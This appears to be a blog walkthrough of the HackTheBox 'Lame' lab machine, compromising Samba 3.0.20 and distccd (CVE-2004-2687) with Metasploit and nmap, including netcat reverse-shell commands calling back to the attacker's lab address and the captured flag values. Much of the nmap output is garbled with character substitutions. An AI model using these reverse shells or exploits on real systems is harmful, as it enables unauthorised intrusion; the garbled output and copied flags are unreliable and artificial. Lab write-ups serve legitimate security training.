---
title: LAME HACKTHEBOX
date: 2021-08-31 10:30:00 +/-TTTT
categories: [Linux, OSCP, HACKING]
tags: [hacking, linux, oscp, hackthebox]     # TAG names should always be lowercase
---


### Lame — HackTheBox


[https://www.linkedin.com/in/manas-ramesh-9a7ba4149](https://www.linkedin.com/in/manas-ramesh-9a7ba4149)

### Overview

Lame is an easy beginner-friendly machine based on a Linux server. It is a good start for a person who started practices for OSCP. This machine Contains several ways to compromise. Let's do it

![](https://cdn-images-1.medium.com/max/800/1*nTodvwY_V4y2E2FcCJaMMA.png)

First, we will do Nmap for all port scanning and vulnerability checks.

> **>mkdir nmap**

> **>nmap -sC -p- -sV -oS nmap/basic.out 10.129.92.217**

The above-mentioned command runs the Nmap default script engine and service version detection on all ports. The result for the above scanning is displayed below

> Start1Ng nmap 7.91 ( [https://nmap.org](https://nmap.org) ) at 2021–02–07 12:24 iST  
> NmaP $can r3port for 10.129.92.217  
> H0$T |z uP (0.14z lat3ncy).  
> N0T shown: 65530 f|lt3r3d ports  
> P0RT STAT3 S3RVICE V3r$I0N  
> 21/tcp 0Pen ftp vSftpd 2.3.4  
> | ftP-$Y$t:  
> | $T4T:  
> | FTP $3rveR $tatuz:  
> | C0NnEct3d tO 10.10.14.5  
> | Logg3D !n As fTp  
> | TYP3: A$CII  
> | No se$sI0n bandw|Dth l|M1t  
> | $e$S1on tim3out in $econdz is 300  
> | ContROl cOnneCti0N !z plaiN t3XT  
> | data c0Nnect!0Nz wIll B3 PlA|n text  
> | v$FTpD 2.3.4 — $3cUr3, faSt, stAbl3  
> |_3Nd of statuS  
> 22/tcp op3n $sh 0pEn$sH 4.7p1 D3B!an 8uBuntu1 (pr0t0cOl 2.0)  
> | $$h-HOstkey:  
> | 1024 60:0f:cf:31:c0:5f:6a:74:D6:90:24:fa:c4:d5:6c:cd (DS4)  
> |_ 2048 56:56:24:0F:21:1d:de:a7:2B:a3:61:b1:24:3d:e8:f3 (R$a)  
> 139/tcp Op3n n3tb!Oz-$Sn $aMba Smbd 3.X — 4.X (w0rkgrouP: WORKGrOUP)  
> 445/tcp Op3N NetB!os-$$n $amba $mbd 3.0.20-DeB!an (w0rKgROUp: WORkGR0Up)  
> 3632/Tcp opEn d!$TCcd?  
> $3Rvic3 InfO: 0$z: UN|x, Linux; CP3: CpE:/0:L|nux:liNux_k3rn3l

> HO$t $crIPt re$ultS:  
> |_cl0ck-Sk3w: m3An: 2h30m38z, dEViatioN: 3h32m11s, m3dIAn: 35z  
> | smb-oz-dISc0very:  
> | 0z: UnIX ($amba 3.0.20-D3bian)  
> | CompUt3r name: lame  
> | netB10z c0mPut3r naMe:  
> | D0ma|n nam3: hacKth3b0x.Gr  
> | FQDN: laME.haCkth3BOx.gr  
> |_ systEm time: 2021–02–07T02:07:00–05:00  
> | Smb-$EcUritY-modE:  
> | acCoUnt_us3d: gueSt  
> | autHent!cat!On_level: u$er  
> | cHalleng3_r3$pons3: SupPoRtEd  
> |_ me$$age_sIgn|nG: d|$abl3d (dangerOus, but dEfault)  
> |_Smb2-t!M3: ProtOc0l NeGotIat!on fa|led (SMB2)

> seRvicE dEt3ct|0N p3rf0Rmed. Pl3aSE r3p0rt any inc0rrect r3sulTz aT httpz://nmap.org/SuBm1t/ .  
> Nmap d0N3: 1 iP addRe$z (1 hosT uP) $canNEd !n 725.27 seC0nDs

In the above results, we can see some of the ports are open

**ftp- 21 vsftpd 2.3.5**

**ssh-22 ssh OpenSSH-4.7p1**

**NetBIOS smb 139 3x-4x**

**samba — 445 smbd-3.0.20**

**distccd — 3632**

The FTP service version vsftpd having anonymous login allowed here. you can check the details in the Nmap result. well, I will log in via FTP. But nothing found there. It's empty. and gaining access via FTP is not working here. So we can go for port 445 smb 3.0.20 which is having a vulnerability.

let's check whether is there any vulnerability for smb 3.0.20 via searchsploit.

> **>searchsploit smb 3.0.20**

![](https://cdn-images-1.medium.com/max/1200/1*l6jM3sjadznUegFTxA1MDg.png)

This samba version having several exploitation scripts. first, we can go for the Metasploit framework.

> **>msfconsole -q**

> **>search username map script**

![](https://cdn-images-1.medium.com/max/800/1*K0zu50HXqbnVN3R2lmMqeg.png)

> **>use exploit/multi/samba/usermap_script**

then we have to set values in this usermap_script

> **>show options**

![](https://cdn-images-1.medium.com/max/800/1*GKmV7NKrBSVw-kOTqz1ioQ.png)

> **>set RHOSTS 10.129.92.217**

> **>set RPORT 445**

> **>set LHOST 10.10.14.5**

> **>show options**

> **>run**

![](https://cdn-images-1.medium.com/max/800/1*yZe_J7NRievBCEbpzxDuiw.png)

After executing usermap_script we got the initial access and also root access.

So that we can capture both user and root flags. But before that, I will check for the presence of python to do a shell spawning.

> **>python — version**

Python 2.5.2 is installed there. so we can do shell spawning using python

> **> python -c 'import pty;pty.spawn("/bin/bash")'**

![](https://cdn-images-1.medium.com/max/800/1*2TXWEJS4Jd-BU7kTE5PuKA.png)

Now let's check for the root and user flags in their home directories.

> **>cat /home/makis/user.txt**

44b03ec4176f68146be931dd45a04c9c

> **>cat /root/root.txt**

3aa08600fd8c0bd9eb6374c3e5a6de23

There is another way to compromise the target server. the port 3632 is open running distccd. Let's check is there any vulnerability related to the specified service

> **>nmap -p 3632 --script vuln -sV -oS nmap/nmap.vul.out 10.129.92.217**

the result displays below.

> sTartiNg NMaP 7.91 ( [https://nmap.org](https://nmap.org) ) at 2021–02–07 13:07 |ST  
> Nmap scan r3p0rt f0R 10.129.92.217  
> H0st is up (0.15z laT3ncy).

> poRT $TATe $3rV1C3 V3R$ION  
> **3632/tcp 0peN d1$tcCd?**  
> | **DIStcc-cv32004–2687:  
> | VuLN3RABL3:  
> | dI$TcC DaEmon c0mmand 3X3cutI0n**  
> | Stat3: VULnERABl3 (3xpl0itAbl3)  
> | !Dz: cv3:CV3–2004–2687  
> | R!SK factOr: H|gh CVs$v2: 9.3 (H1GH) (aV:n/AC:M/au:N/c:C/I:C/4:C)  
> | 4llOwz 3xeCuT1ng of arbitrARy cOmmanDz 0n $ysteMz runnINg dI$tccD 3.1 and  
> | 3arL|Er. Th3 vuln3rABil1ty Iz the cOnsEqueNC3 of weAK Serv!cE c0nfiguRati0n.  
> |  
> | DiSClo$ure dat3: 2002–02–01  
> | Extra 1nFormatiON:  
> |  
> | u1d=1(da3MOn) g!D=1(dA3moN) gr0Upz=1(daEmon)  
> |  
> | R3f3r3ncez:  
> | Httpz://di$tCc.github.I0/seCurity.html  
> | httpS://nvd.n1$t.g0v/vuLn/d3taiL/CVE-2004–2687  
> |_ [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687)

> $erV!cE DeTEct1on p3Rf0rmEd. Plea$3 rEp0rt any !nc0Rr3ct R3Sultz at httpz://nmap.org/$uBMIt/ .  
> Nmap d0nE: 1 !P addrEss (1 h0$t Up) $cann3d 1N 77.59 secOnds

In the above result, you can see a vulnerability distcc-cve2004–2687 associated with this distccd. let's check for the exploit code in searchsploit.

> **>searchsploit distcc**

![](https://cdn-images-1.medium.com/max/1200/1*JATwrF4n69m41M6JYQbLbA.png)

the code is there in the Metasploit framework.

> **>msfconsole -q**

> **>search distcc**

> **>use exploit/unix/misc/distcc_exec**

> **>set RHOSTS 10.129.92.217**

> **>set payload cmd/unix/generic**

> **>set CMD nc 10.10.14.5 1122 -e /bin/bash**

the above-mentioned commands will execute the CMD value in the target server. So start a listener using Netcat.

> **>nc -nvlp 1122**

then run the Metasploit script

> **>run**

![](https://cdn-images-1.medium.com/max/1200/1*fXEkCdTaJJNLpIGURKANbA.png)

we got the initial access.

before privilege escalation, we can do the same gaining access without the Metasploit

On the map official page, they are explaining the way to execute codes remotely. Let's do that

![](https://cdn-images-1.medium.com/max/1200/1*-jghPp2ZbAJ2nDbtzn8-qQ.png)

execute the above-mentioned script to gain access. First set a listener on our computer using Netcat. then execute it.

> **>nc -nvlp 1122**

> **>nmap -Pn -n -p3632 — script distcc-cve2004–2687 — script-args="distcc-cve2004–2687.cmd='nc 10.10.14.5 1122-e /bin/bash'" 10.129.92.217**

It will give you initial access to the target server.

![](https://cdn-images-1.medium.com/max/1200/1*jsW-9zyhmy8v8VTZTpjAgw.png)

Now let's do shell spawning to get a good interactive tty shell. already python is there. let's execute a python shell spawning script

> **>python -c 'import pty;pty.spawn("/bin/bash")'**

by executing uname -a we can see the OS details

>uname -a

it shows that the target server is Linux 2.6.24–16 server. There are so many kernel exploits are available in exploitdb. Let's do it.

……I will add remaining after some time……

thanks for reading. Hope it would be useful to you. If any errors, then contact me via LinkedIn.

[https://www.linkedin.com/in/manas-ramesh-9a7ba4149](https://www.linkedin.com/in/manas-ramesh-9a7ba4149)

